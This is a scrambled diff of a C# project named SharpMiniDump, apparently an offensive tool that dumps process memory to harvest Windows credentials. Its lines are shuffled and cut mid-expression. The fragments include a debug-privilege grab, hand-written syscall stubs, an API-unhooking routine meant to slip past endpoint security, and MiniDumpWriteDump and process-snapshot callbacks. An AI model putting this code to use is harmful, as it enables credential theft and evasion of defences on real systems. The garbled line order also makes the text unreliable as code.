@@ -1,0 +1,2044 @@
+    
+        
+            
+                        FunctionPtr = (IntPtr)((Int64)ModuleBase 
+                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() 
+                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() 
+                        break
+                        throw new Win32Exception()
+                    IntPtr memoryAddress = (IntPtr)ptr
+                    String FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() 
+                    if (FunctionName.ToLower() == ExportName.ToLower())
+                    pExport = OptHeader 
+                    return (NTSTATUS)myAssemblyFunction(handle)
+                    return Mod.BaseAddress
+                    throw new FileNotFoundException(DLLName 
+                    {
+                    }
+                 eaLength)
+                // Catch parser failure
+                // Export not found
+                // Loop the array of export name RVA's
+                // Read -> IMAGE_EXPORT_DIRECTORY
+                // Traverse the PE header in memory
+                CallbackOutput.Status = 1
+                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader)
+                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() 
+                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport)
+                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() 
+                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() 
+                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() 
+                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() 
+                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() 
+                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() 
+                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() 
+                Int64 OptHeader = ModuleBase.ToInt64() 
+                Int64 pExport = 0
+                NativeSysCall.ZwClose10(hProcess)
+                SecurityQualityOfService = IntPtr.Zero
+                UInt32 eaLength)
+                else
+                fixed (byte
+                for (int i = 0
+                hModule = LoadModuleFromDisk(DLLName)
+                if (Magic == 0x010b)
+                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
+                if (hModule == IntPtr.Zero)
+                out returnLength
+                ref IntPtr ModuleHandle)
+                return
+                return IntPtr.Zero
+                return false
+                return true
+                throw new DllNotFoundException(DLLName 
+                throw new MissingMethodException(ExportName 
+                {
+                }
+            )
+            // Error
+            // If the FileType is VFT_DRV
+            // If the FileType is VFT_FONT
+            // Informational
+            // Success
+            // Warning
+            //https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Tokens.cs
+            AssemblyBytes[4] = (byte)pWinVerInfo.SystemCall
+            Boolean result = Natives.GetTokenInformation(
+            CONTEXT_ALL = CONTEXT_CONTROL 
+            CONTEXT_CONTROL = CONTEXT_i386 
+            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 
+            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 
+            CONTEXT_FLOATING_POINT = CONTEXT_i386 
+            CONTEXT_FULL = CONTEXT_CONTROL 
+            CONTEXT_INTEGER = CONTEXT_i386 
+            CONTEXT_SEGMENTS = CONTEXT_i386 
+            CallbackInfo.CallbackParam = IntPtr.Zero
+            CallbackInfo.CallbackRoutine = Program.MyMiniDumpWriteDumpCallback
+            Execute(args)
+            IntPtr CallbackParam = IntPtr.Zero
+            IntPtr ExceptionParam = IntPtr.Zero
+            IntPtr FunctionPtr = IntPtr.Zero
+            IntPtr SnapshotHandle = IntPtr.Zero
+            IntPtr UserStreamParam = IntPtr.Zero
+            IntPtr currentProcessToken = new IntPtr()
+            IntPtr hElm = IntPtr.Zero
+            IntPtr hModule = GetLoadedModuleAddress(DLLName)
+            IntPtr hModule = IntPtr.Zero
+            IntPtr hProcess = IntPtr.Zero
+            IntPtr hToken = GetCurrentProcessToken()
+            IntPtr lpBaseAddress = proc
+            IntPtr lpValue = Marshal.AllocHGlobal(Marshal.SizeOf(tk))
+            IntPtr objectName = Marshal.AllocHGlobal(Marshal.SizeOf(uFileName))
+            IntPtr pCallbackInfo = Marshal.AllocHGlobal(Marshal.SizeOf(CallbackInfo))
+            IntPtr unmanagedPointer = Marshal.AllocHGlobal(AssemblyBytes.Length)
+            IntPtr written = IntPtr.Zero
+            MEM_PRIVATE = 0x20000
+            MEM_RESERVE = 0x2000
+            Marshal.FreeHGlobal(unmanagedPointer)
+            MaxSystemInfoClass = 0x0095
+            MaxTokenInfoClass
+            MaximumNtStatus = 0xffffffff
+            Microsoft.Win32.SafeHandles.SafeFileHandle hDmpFile
+            MiniSecondaryWithoutPowerInfo = 0x00000001
+            ModuleWriteCodeSegs = 0x0040
+            NativeSysCall.ZwClose10(hProcess)
+            Natives.CLIENT_ID clientid = new Natives.CLIENT_ID()
+            Natives.IO_STATUS_BLOCK IoStatusBlock = new Natives.IO_STATUS_BLOCK()
+            Natives.LARGE_INTEGER lint = new Natives.LARGE_INTEGER()
+            Natives.LUID luid = new Natives.LUID()
+            Natives.LUID_AND_ATTRIBUTES luidAndAttributes = new Natives.LUID_AND_ATTRIBUTES()
+            Natives.MINIDUMP_CALLBACK_INFORMATION CallbackInfo = new Natives.MINIDUMP_CALLBACK_INFORMATION()
+            Natives.OBJECT_ATTRIBUTES FileObjectAttributes = new Natives.OBJECT_ATTRIBUTES
+            Natives.OBJECT_ATTRIBUTES objAttribute = new Natives.OBJECT_ATTRIBUTES()
+            Natives.OSVERSIONINFOEXW osInfo = new Natives.OSVERSIONINFOEXW()
+            Natives.PSS_CAPTURE_FLAGS flags = Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_VA_CLONE
+            Natives.RtlGetVersion(ref osInfo)
+            Natives.TOKEN_ELEVATION tk = new Natives.TOKEN_ELEVATION()
+            Natives.TOKEN_PRIVILEGES newState = new Natives.TOKEN_PRIVILEGES()
+            Natives.TOKEN_PRIVILEGES previousState = new Natives.TOKEN_PRIVILEGES()
+            Natives.UNICODE_STRING uFileName = new Natives.UNICODE_STRING()
+            Natives.UNICODE_STRING uModuleName = new Natives.UNICODE_STRING()
+            Natives.WIN_VER_INFO pWinVerInfo = new Natives.WIN_VER_INFO()
+            PAGE_WRITECOMBINE = 0x400
+            PSS_CREATE_RELEASE_SECTION
+            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules
+            SetDebugPrivilege()
+            Synchronize = 0x00100000
+            TOKEN_ADJUST_PRIVILEGES 
+            TOKEN_ADJUST_SESSIONID)
+            TOKEN_DUPLICATE 
+            ThreadWriteThreadInfo = 0x0040
+            TokenElevationTypeLimited
+            UInt32 returnLength
+            UInt32 returnLength = 0
+            UInt32 tokenInformationLength = (UInt32)Marshal.SizeOf(typeof(Natives.TOKEN_ELEVATION))
+            VFT2_UNKNOWN = 0x00000000
+            VFT_VXD = 0x00000005
+            VOS_UNKNOWN = 0x00000000
+            VS_FF_SPECIALBUILD = 0x00000020
+            VmPostReadCallback
+            [FieldOffset(0)]
+            [FieldOffset(4)]
+            [FieldOffset(CallbackTypeOffset)]
+            [FieldOffset(UnionOffset)]
+            [MarshalAs(UnmanagedType.Bool)]
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+            byte[] syscall = bNtAllocateVirtualMemory10
+            byte[] syscall = bNtCreateFile10
+            byte[] syscall = bNtFreeVirtualMemory10
+            byte[] syscall = bZwClose10
+            byte[] syscall = bZwOpenProcess10
+            byte[] syscall = bZwProtectVirtualMemory10
+            byte[] syscall = bZwQuerySystemInformation10
+            byte[] syscall = bZwWriteVirtualMemory10
+            catch
+            clientid.UniqueProcess = (IntPtr)processId
+            clientid.UniqueProcess = pWinVerInfo.hTargetPID
+            clientid.UniqueThread = IntPtr.Zero
+            const int UnionOffset = CallbackTypeOffset 
+            else
+            else if (hModule == IntPtr.Zero)
+            foreach (ProcessModule Mod in ProcModules)
+            hDmpFile.Dispose()
+            if (!IsElevated())
+            if (!UnHookNativeApi(pWinVerInfo))
+            if (CallResult != Natives.NTSTATUS.Success 
+            if (FunctionPtr == IntPtr.Zero)
+            if (IntPtr.Size != 8)
+            if (SnapshotHandle == IntPtr.Zero)
+            if (elv.TokenIsElevated == 1)
+            if (hDmpFile.IsInvalid)
+            if (hModule == IntPtr.Zero 
+            if (hProcess == IntPtr.Zero)
+            if (status != Natives.NTSTATUS.Success)
+            lint.HighPart = 0
+            lint.LowPart = 0
+            long allocationsize = 0
+            luidAndAttributes.Attributes = Natives.SE_PRIVILEGE_ENABLED
+            luidAndAttributes.Luid = luid
+            newState.PrivilegeCount = 1
+            newState.Privileges = luidAndAttributes
+            osInfo.dwOSVersionInfoSize = Marshal.SizeOf(osInfo)
+            pWinVerInfo.SystemCall = 0x3F
+            pWinVerInfo.chOSMajorMinor = osInfo.dwMajorVersion 
+            public CONTEXT_FLAGS ContextFlags
+            public CancelCallbackOutput Cancel
+            public IntPtr Buffer
+            public IntPtr CallbackParam
+            public IntPtr CvRecord
+            public IntPtr FullPath
+            public IntPtr Handle
+            public IntPtr InheritedFromUniqueProcessId
+            public IntPtr MiscRecord
+            public IntPtr ObjectName
+            public IntPtr PagefileUsage
+            public IntPtr PeakPagefileUsage
+            public IntPtr PeakVirtualSize
+            public IntPtr PeakWorkingSetSize
+            public IntPtr PrivatePageCount
+            public IntPtr ProcessHandle
+            public IntPtr QuotaNonPagedPoolUsage
+            public IntPtr QuotaPagedPoolUsage
+            public IntPtr QuotaPeakNonPagedPoolUsage
+            public IntPtr QuotaPeakPagedPoolUsage
+            public IntPtr RootDirectory
+            public IntPtr SecurityDescriptor
+            public IntPtr SecurityQualityOfService
+            public IntPtr ThreadHandle
+            public IntPtr UniqueProcess
+            public IntPtr UniqueProcessId
+            public IntPtr UniqueProcessKey
+            public IntPtr UniqueThread
+            public IntPtr VirtualSize
+            public IntPtr WorkingSetSize
+            public IntPtr hTargetPID
+            public IntPtr information
+            public LARGE_INTEGER OtherOperationCount
+            public LARGE_INTEGER OtherTransferCount
+            public LARGE_INTEGER ReadOperationCount
+            public LARGE_INTEGER ReadTransferCount
+            public LARGE_INTEGER WorkingSetPrivateSize
+            public LARGE_INTEGER WriteOperationCount
+            public LARGE_INTEGER WriteTransferCount
+            public LUID Luid
+            public LUID_AND_ATTRIBUTES Privileges
+            public M128A[] FloatRegisters
+            public M128A[] VectorRegister
+            public M128A[] XmmRegisters
+            public MINIDUMP_CALLBACK_ROUTINE CallbackRoutine
+            public MINIDUMP_CALLBACK_TYPE CallbackType
+            public MINIDUMP_INCLUDE_MODULE_CALLBACK IncludeModule
+            public MINIDUMP_INCLUDE_THREAD_CALLBACK IncludeThread
+            public MINIDUMP_IO_CALLBACK Io
+            public MINIDUMP_MEMORY_INFO VmRegion
+            public MINIDUMP_MODULE_CALLBACK Module
+            public MINIDUMP_READ_MEMORY_FAILURE_CALLBACK ReadMemoryFailure
+            public MINIDUMP_SECONDARY_FLAGS SecondaryFlags
+            public MINIDUMP_THREAD_CALLBACK BasePart
+            public MINIDUMP_THREAD_CALLBACK Thread
+            public MINIDUMP_THREAD_EX_CALLBACK ThreadEx
+            public MODULE_WRITE_FLAGS ModuleWriteFlags
+            public MemoryCallbackOutput Memory
+            public MemoryInfoCallbackOutput MemoryInfo
+            public PROTECT Protect
+            public STATE State
+            public THREAD_WRITE_FLAGS ThreadWriteFlags
+            public TYPE Type
+            public UInt16 Length
+            public UInt16 MaximumLength
+            public UInt16 wServicePackMajor
+            public UInt16 wServicePackMinor
+            public UInt16 wSuiteMask
+            public UInt32 Attributes
+            public UInt32 HighPart
+            public UInt32 LowPart
+            public UInt32 PrivilegeCount
+            public UNICODE_STRING ImageName
+            public UNICODE_STRING ProcName
+            public VS_FIXEDFILEINFO VersionInfo
+            public XSAVE_FORMAT64 DUMMYUNIONNAME
+            public bool Cancel
+            public bool CheckCancel
+            public bool Continue
+            public byte Reserved1
+            public byte TagWord
+            public byte wProductType
+            public byte wReserved
+            public byte[] Reserved4
+            public delegate Boolean ImpersonateLoggedOnUser(IntPtr hToken)
+            public delegate IntPtr GetCurrentProcess()
+            public delegate bool CloseHandle(IntPtr handle)
+            public delegate bool RevertToSelf()
+            public delegate bool RtlGetVersion(ref OSVERSIONINFOEXW lpVersionInformation)
+            public delegate int ZwClose(IntPtr handle)
+            public fixed byte Context[1232]
+            public int BasePriority
+            public int FailureStatus
+            public int HandleCount
+            public int NextEntryOffset
+            public int NumberOfThreads
+            public int SessionId
+            public int Status
+            public int SystemCall
+            public int TokenIsElevated
+            public int dwBuildNumber
+            public int dwMajorVersion
+            public int dwMinorVersion
+            public int dwOSVersionInfoSize
+            public int dwPlatformId
+            public long CreateTime
+            public long KernelTime
+            public long Low
+            public long UserTime
+            public long dwBuildNumber
+            public override string ToString()
+            public string chOSMajorMinor
+            public string lpApiCall
+            public string szCSDVersion
+            public uint AllocationProtect
+            public uint BufferBytes
+            public uint Bytes
+            public uint CheckSum
+            public uint DataOffset
+            public uint EFlags
+            public uint ErrorOffset
+            public uint HardFaultCount
+            public uint MemorySize
+            public uint MxCsr
+            public uint MxCsr_Mask
+            public uint NumberOfThreadsHighWatermark
+            public uint PageFaultCount
+            public uint ProcessId
+            public uint SecondaryFlags
+            public uint SizeOfContext
+            public uint SizeOfCvRecord
+            public uint SizeOfImage
+            public uint SizeOfMiscRecord
+            public uint ThreadId
+            public uint TimeDateStamp
+            public uint __alignment1
+            public uint __alignment2
+            public uint dwFileDateLS
+            public uint dwFileDateMS
+            public uint dwFileFlags
+            public uint dwFileFlagsMask
+            public uint dwFileOS
+            public uint dwFileSubtype
+            public uint dwFileType
+            public uint dwFileVersionLS
+            public uint dwFileVersionMS
+            public uint dwProductVersionLS
+            public uint dwProductVersionMS
+            public uint dwSignature
+            public uint dwStrucVersion
+            public uint status
+            public ulong AllocationBase
+            public ulong Attributes
+            public ulong BackingStoreBase
+            public ulong BackingStoreEnd
+            public ulong BaseAddress
+            public ulong BaseOfImage
+            public ulong CycleTime
+            public ulong DebugControl
+            public ulong Dr0
+            public ulong Dr1
+            public ulong Dr2
+            public ulong Dr3
+            public ulong Dr6
+            public ulong Dr7
+            public ulong High
+            public ulong LastBranchFromRip
+            public ulong LastBranchToRip
+            public ulong LastExceptionFromRip
+            public ulong LastExceptionToRip
+            public ulong Length
+            public ulong MemoryBase
+            public ulong Offset
+            public ulong P1Home
+            public ulong P2Home
+            public ulong P3Home
+            public ulong P4Home
+            public ulong P5Home
+            public ulong P6Home
+            public ulong R10
+            public ulong R11
+            public ulong R12
+            public ulong R13
+            public ulong R14
+            public ulong R15
+            public ulong R8
+            public ulong R9
+            public ulong Rax
+            public ulong Rbp
+            public ulong Rbx
+            public ulong Rcx
+            public ulong Rdi
+            public ulong Rdx
+            public ulong RegionSize
+            public ulong Rip
+            public ulong Rsi
+            public ulong Rsp
+            public ulong StackBase
+            public ulong StackEnd
+            public ulong VectorControl
+            public ushort ControlWord
+            public ushort DataSelector
+            public ushort ErrorOpcode
+            public ushort ErrorSelector
+            public ushort Reserved2
+            public ushort Reserved3
+            public ushort SegCs
+            public ushort SegDs
+            public ushort SegEs
+            public ushort SegFs
+            public ushort SegGs
+            public ushort SegSs
+            public ushort StatusWord
+            return CloseHandle(handle)
+            return FunctionPtr
+            return GetCurrentProcess()
+            return IntPtr.Zero
+            return RtlGetVersion(ref lpVersionInformation)
+            return TokenIsElevated(GetCurrentProcessToken())
+            return currentProcessToken
+            return hModule
+            return hProcess
+            return true
+            status = NativeSysCall.NtCreateFile10(
+            switch (CallbackInput.CallbackType)
+            tk.TokenIsElevated = 0
+            try
+            uint NewProtection = 0
+            uint OldProtection = 0
+            uint uSize = 10
+            unsafe
+            {
+            {             
+            }
+          FILE_APPEND_DATA 
+          FILE_EXECUTE 
+          FILE_READ_ATTRIBUTES 
+          FILE_READ_DATA 
+          FILE_READ_EA 
+          FILE_WRITE_ATTRIBUTES 
+          FILE_WRITE_DATA 
+          FILE_WRITE_EA 
+          SYNCHRONIZE
+        /// 8:  0f 05                   syscall
+        /// </summary>
+        /// <author>Ruben Boonen (@FuzzySec)</author>
+        /// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module is not found.</returns>
+        /// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module was not loaded successfully.</returns>
+        /// <returns>IntPtr for the desired function.</returns>
+        /// <summary>
+        /// Helper for getting the base address of a module loaded by the current process. This base address could be passed to GetProcAddress/LdrGetProcedureAddress or it could be used for manual export parsing.
+        /// Helper for getting the pointer to a function from a DLL loaded by the process.
+        /// Resolves LdrLoadDll and uses that function to load a DLL from disk.
+        /// a:  c3                      ret
+        /// x64
+        ///8:  0f 05                   syscall
+        ///a:  c3                      ret
+        [Flags]
+        [StructLayout(LayoutKind.Explicit)]
+        [StructLayout(LayoutKind.Sequential)]
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        break
+        case Natives.MINIDUMP_CALLBACK_TYPE.IsProcessSnapshotCallback: // IsProcessSnapshotCallback
+        const int CallbackTypeOffset = 4 
+        enum VS_FIXEDFILEINFO_FileFlags : uint
+        enum VS_FIXEDFILEINFO_FileOSFlags : uint
+        enum VS_FIXEDFILEINFO_FileTypeFlags : uint
+        enum VS_FIXEFILEINFO_FileSubTypeFlags : uint
+        private static IntPtr GetAdvapi32()
+        private static IntPtr GetCurrentProcessToken()
+        private static IntPtr GetDbgcore()
+        private static IntPtr GetKernel32()
+        private static IntPtr GetKernelbase()
+        private static IntPtr GetNtDll()
+        private static bool IsElevated()
+        private static bool TokenIsElevated(IntPtr hToken)
+        private static bool UnHookNativeApi(Natives.WIN_VER_INFO pWinVerInfo)
+        public const UInt32 SE_PRIVILEGE_ENABLED = 0x2
+        public const UInt32 STANDARD_RIGHTS_READ = 0x00020000
+        public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000
+        public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080
+        public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040
+        public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020
+        public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100
+        public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED 
+        public const UInt32 TOKEN_ALT = (TOKEN_ASSIGN_PRIMARY 
+        public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001
+        public const UInt32 TOKEN_DUPLICATE = 0x0002
+        public const UInt32 TOKEN_IMPERSONATE = 0x0004
+        public const UInt32 TOKEN_QUERY = 0x0008
+        public const UInt32 TOKEN_QUERY_SOURCE = 0x0010
+        public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ 
+        public const int CREATE_ALWAYS = 2
+        public const int FILE_ACTION_ADDED = 0x00000001
+        public const int FILE_ACTION_MODIFIED = 0x00000003
+        public const int FILE_ACTION_REMOVED = 0x00000002
+        public const int FILE_ACTION_RENAMED_NEW_NAME = 0x00000005
+        public const int FILE_ACTION_RENAMED_OLD_NAME = 0x00000004
+        public const int FILE_ADD_FILE = 0x0002
+        public const int FILE_ADD_SUBDIRECTORY = 0x0004
+        public const int FILE_APPEND_DATA = 0x0004
+        public const int FILE_ATTRIBUTE_ARCHIVE = 0x00000020
+        public const int FILE_ATTRIBUTE_COMPRESSED = 0x00000800
+        public const int FILE_ATTRIBUTE_DEVICE = 0x00000040
+        public const int FILE_ATTRIBUTE_DIRECTORY = 0x00000010
+        public const int FILE_ATTRIBUTE_ENCRYPTED = 0x00004000
+        public const int FILE_ATTRIBUTE_HIDDEN = 0x00000002
+        public const int FILE_ATTRIBUTE_NORMAL = 0x00000080
+        public const int FILE_ATTRIBUTE_NOT_CONTENT_INDEXED = 0x00002000
+        public const int FILE_ATTRIBUTE_OFFLINE = 0x00001000
+        public const int FILE_ATTRIBUTE_READONLY = 0x00000001
+        public const int FILE_ATTRIBUTE_REPARSE_POINT = 0x00000400
+        public const int FILE_ATTRIBUTE_SPARSE_FILE = 0x00000200
+        public const int FILE_ATTRIBUTE_SYSTEM = 0x00000004
+        public const int FILE_ATTRIBUTE_TEMPORARY = 0x00000100
+        public const int FILE_CASE_PRESERVED_NAMES = 0x00000002
+        public const int FILE_CASE_SENSITIVE_SEARCH = 0x00000001
+        public const int FILE_CREATE_PIPE_INSTANCE = 0x0004
+        public const int FILE_DELETE_CHILD = 0x0040
+        public const int FILE_EXECUTE = 0x0020
+        public const int FILE_FILE_COMPRESSION = 0x00000010
+        public const int FILE_LIST_DIRECTORY = 0x0001
+        public const int FILE_NAMED_STREAMS = 0x00040000
+        public const int FILE_NOTIFY_CHANGE_ATTRIBUTES = 0x00000004
+        public const int FILE_NOTIFY_CHANGE_CREATION = 0x00000040
+        public const int FILE_NOTIFY_CHANGE_DIR_NAME = 0x00000002
+        public const int FILE_NOTIFY_CHANGE_FILE_NAME = 0x00000001
+        public const int FILE_NOTIFY_CHANGE_LAST_ACCESS = 0x00000020
+        public const int FILE_NOTIFY_CHANGE_LAST_WRITE = 0x00000010
+        public const int FILE_NOTIFY_CHANGE_SECURITY = 0x00000100
+        public const int FILE_NOTIFY_CHANGE_SIZE = 0x00000008
+        public const int FILE_OVERWRITE_IF = 0x00000005
+        public const int FILE_PERSISTENT_ACLS = 0x00000008
+        public const int FILE_READ_ATTRIBUTES = 0x0080
+        public const int FILE_READ_DATA = 0x0001
+        public const int FILE_READ_EA = 0x0008
+        public const int FILE_READ_ONLY_VOLUME = 0x00080000
+        public const int FILE_SHARE_DELETE = 0x00000004
+        public const int FILE_SHARE_READ = 0x00000001
+        public const int FILE_SHARE_WRITE = 0x00000002
+        public const int FILE_SUPPORTS_ENCRYPTION = 0x00020000
+        public const int FILE_SUPPORTS_OBJECT_IDS = 0x00010000
+        public const int FILE_SUPPORTS_REMOTE_STORAGE = 0x00000100
+        public const int FILE_SUPPORTS_REPARSE_POINTS = 0x00000080
+        public const int FILE_SUPPORTS_SPARSE_FILES = 0x00000040
+        public const int FILE_SYNCHRONOUS_IO_NONALERT = 0x00000020
+        public const int FILE_TRAVERSE = 0x0020
+        public const int FILE_UNICODE_ON_DISK = 0x00000004
+        public const int FILE_VOLUME_IS_COMPRESSED = 0x00008000
+        public const int FILE_VOLUME_QUOTAS = 0x00000020
+        public const int FILE_WRITE_ATTRIBUTES = 0x0100
+        public const int FILE_WRITE_DATA = 0x0002
+        public const int FILE_WRITE_EA = 0x0010
+        public const int MAILSLOT_NO_MESSAGE = -1
+        public const int MAILSLOT_WAIT_FOREVER = -1
+        public const long FILE_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED 
+        public const long FILE_GENERIC_EXECUTE = STANDARD_RIGHTS_EXECUTE 
+        public const long FILE_GENERIC_READ = STANDARD_RIGHTS_READ 
+        public const long FILE_GENERIC_WRITE = STANDARD_RIGHTS_WRITE 
+        public const long READ_CONTROL = 0x00020000
+        public const long SPECIFIC_RIGHTS_ALL = 0x0000FFFF
+        public const long STANDARD_RIGHTS_ALL = 0x001F0000
+        public const long STANDARD_RIGHTS_EXECUTE = READ_CONTROL
+        public const long STANDARD_RIGHTS_WRITE = READ_CONTROL
+        public const long SYNCHRONIZE = 0x00100000
+        public delegate bool MINIDUMP_CALLBACK_ROUTINE(
+        public enum CONTEXT_FLAGS : uint
+        public enum MINIDUMP_CALLBACK_TYPE : uint
+        public enum MINIDUMP_SECONDARY_FLAGS : uint
+        public enum MODULE_WRITE_FLAGS : uint
+        public enum NTSTATUS : uint
+        public enum PROTECT : uint
+        public enum PSS_CAPTURE_FLAGS {
+        public enum ProcessAccessFlags : uint
+        public enum STATE : uint
+        public enum SYSTEM_INFORMATION_CLASS
+        public enum THREAD_WRITE_FLAGS : uint
+        public enum TOKEN_ELEVATION_TYPE
+        public enum TOKEN_INFORMATION_CLASS
+        public enum TYPE : uint
+        public static IntPtr GetCurrentProcess()
+        public static IntPtr GetLoadedModuleAddress(string DLLName)
+        public static IntPtr LoadLibrary(string name)
+        public static IntPtr LoadModuleFromDisk(string DLLPath)
+        public static NTSTATUS ZwClose10(IntPtr handle)
+        public static bool CloseHandle(IntPtr handle)
+        public static bool RtlGetVersion(ref OSVERSIONINFOEXW lpVersionInformation)
+        public static bool SetDebugPrivilege()
+        public static void Execute(string[] args)
+        public struct CLIENT_ID
+        public struct CONTEXT
+        public struct CancelCallbackOutput
+        public struct Delegates
+        public struct IO_STATUS_BLOCK
+        public struct LARGE_INTEGER
+        public struct LUID
+        public struct LUID_AND_ATTRIBUTES
+        public struct M128A
+        public struct MINIDUMP_CALLBACK_INFORMATION
+        public struct MINIDUMP_CALLBACK_INPUT
+        public struct MINIDUMP_CALLBACK_OUTPUT
+        public struct MINIDUMP_INCLUDE_MODULE_CALLBACK
+        public struct MINIDUMP_INCLUDE_THREAD_CALLBACK
+        public struct MINIDUMP_IO_CALLBACK
+        public struct MINIDUMP_MEMORY_INFO
+        public struct MINIDUMP_MODULE_CALLBACK
+        public struct MINIDUMP_READ_MEMORY_FAILURE_CALLBACK
+        public struct MINIDUMP_THREAD_EX_CALLBACK
+        public struct MemoryCallbackOutput
+        public struct MemoryInfoCallbackOutput
+        public struct OBJECT_ATTRIBUTES
+        public struct OSVERSIONINFOEXW
+        public struct SYSTEM_PROCESSES
+        public struct TOKEN_ELEVATION {
+        public struct TOKEN_PRIVILEGES
+        public struct UNICODE_STRING
+        public struct VS_FIXEDFILEINFO
+        public struct WIN_VER_INFO
+        public struct XSAVE_FORMAT64
+        public unsafe struct MINIDUMP_THREAD_CALLBACK
+        return true
+        static void Main(string[] args)
+        {
+        }
+     // all
+     // directory
+     // file
+     // file 
+     // named pipe
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <AssemblyName>SharpMiniDump</AssemblyName>
+    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DebugType>pdbonly</DebugType>
+    <DefineConstants>DEBUG
+    <DefineConstants>TRACE</DefineConstants>
+    <Deterministic>true</Deterministic>
+    <ErrorReport>prompt</ErrorReport>
+    <FileAlignment>512</FileAlignment>
+    <Optimize>false</Optimize>
+    <OutputPath>bin
+    <OutputType>Exe</OutputType>
+    <PlatformTarget>x64</PlatformTarget>
+    <ProjectGuid>{6FFCCF81-6C3C-4D3F-B15F-35A86D0B497F}</ProjectGuid>
+    <RootNamespace>SharpMiniDump</RootNamespace>
+    <StartupObject />
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <WarningLevel>4</WarningLevel>
+    class NativeSysCall
+    class Natives
+    public class CustomLoadLibrary
+    public class Program
+    {
+    }
+   and/or other materials provided with the distribution.
+   contributors may be used to endorse or promote products derived from
+   list of conditions and the following disclaimer.
+   this list of conditions and the following disclaimer in the documentation
+   this software without specific prior written permission.
+  </ItemGroup>
+  </PropertyGroup>
+  <ItemGroup>
+  <PropertyGroup>
+ !tools/packages.config
+ (4 
+ (FunctionOrdinal - OrdinalBase))))
+ (https://github.com/github/gitignore/pull/1529
+ (https://github.com/github/gitignore/pull/2483
+ .NET Core
+ // HRESULT
+ // This is a PCWSTR
+ 0x10))
+ 0x14))
+ 0x18
+ 0x18))
+ 0x1C))
+ 0x1FF
+ 0x20))
+ 0x24))
+ 0x3C))
+ 0x60
+ 0x70
+ 2)) 
+ 4))))
+ Auto detect text files and perform LF normalization
+ AxoCover is a Code Coverage Tool
+ Azure Stream Analytics local run output
+ Backup 
+ Backup folder for Package Reference Convert tool in Visual Studio 2017
+ BeatPulse healthcheck temp database
+ Benchmark Results
+ BizTalk build output
+ Build Results of an ATL Project
+ Build results
+ Business Intelligence projects
+ CONTEXT_DEBUG_REGISTERS 
+ CONTEXT_EXTENDED_REGISTERS
+ CONTEXT_FLOATING_POINT 
+ CONTEXT_INTEGER 
+ CONTEXT_SEGMENTS 
+ Cake - Uncomment if you are using it
+ CanLoadFromDisk)
+ Chutzpah Test files
+ Click-Once directory
+ CodeRush personal settings
+ DocProject is a documentation generator add-in
+ DotCover is a Code Coverage Tool
+ ExportRVA 
+ FAKE - F
+ Files built by Visual Studio
+ Files/
+ FunctionRVA)
+ FunctionsRVA 
+ Get latest from https://github.com/github/gitignore/blob/master/VisualStudio.gitignore
+ GhostDoc plugin setting file
+ Guidance Automation Toolkit
+ Including strong name files can present a security risk
+ Installshield output folder
+ IoStatusBlock.status)
+ JustCode is a .NET coding add-in
+ Local History for Visual Studio
+ MFractors (Xamarin productivity tool) working folder
+ MSBuild Binary and Structured Log
+ MSTest test Results
+ Make
+ Marshal.PtrToStringUni(uFileName.Buffer).Substring(4))
+ Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() 
+ Microsoft Azure Build Output
+ Microsoft Azure Emulator
+ Microsoft Azure Web App publish settings. Comment the next line if you want to
+ Microsoft Fakes
+ MightyMoose
+ Mono auto generated files
+ NCrunch
+ NUnit
+ NVidia Nsight GPU debugger configuration file
+ NamesRVA 
+ Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLES
+ Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_BASIC_INFORMATION
+ Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_NAME_INFORMATION
+ Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TRACE
+ Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
+ Natives.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREADS
